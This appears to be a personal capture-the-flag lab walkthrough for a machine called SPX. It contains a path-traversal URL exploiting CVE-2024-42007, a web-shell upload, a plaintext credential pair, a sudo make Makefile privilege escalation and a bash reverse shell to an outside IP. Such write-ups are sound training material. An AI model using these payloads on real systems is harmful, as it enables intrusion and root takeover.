# SPX Walkthrough

## 🔍 Initial Foothold

- Exploit Used: [CVE-2024-42007](https://github.com/BubblyCola/CVE_2024_42007)
- Accessed vulnerable URL:
  ```
  http://192.168.163.108/index.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php
  ```
- Retrieved the index.php file which showed password hashes.
- Recognized structure from `tinyfilemanager.php`.
- Cracked hashes and logged in to the web interface.
- Uploaded `shell.php` and gained initial shell.

## ⚙️ Privilege Escalation

- Discovered user `profiler` with credentials: `profiler:lowprofile`.
- Same credentials worked for admin as well.
- Found this sudo command allowed:
  ```bash
  sudo /usr/bin/make install -C /home/profiler/php-spx
  ```
- Edited `Makefile`:
  ```makefile
  SHELL=/bin/bash /tmp/sh
  ```
- Created `/tmp/sh` file with reverse shell:
  ```bash
  bash -i >& /dev/tcp/192.168.45.194/80 0>&1
  chmod +x /tmp/sh
  ```

- Ran:
  ```bash
  sudo /usr/bin/make install -C /home/profiler/php-spx
  ```
  ➜ Received root shell 🎉

## 🧠 Notes for Stable Shell

To gain interactive shell for nano/editing:
```bash
script -qc /bin/bash
[press Ctrl+Z]
stty raw -echo; fg
export TERM=xterm-256color
```

Then run:
```bash
su <username>
```

---

## 🚀 Git Commands

```bash
# Move to your project directory
mv ~/Downloads/SPX.md ~/Downloads/walkthroughs_project_template/linux/SPX.md

cd ~/Downloads/walkthroughs_project_template

git add .

git commit -m "Added SPX (Linux) walkthrough"

git push
```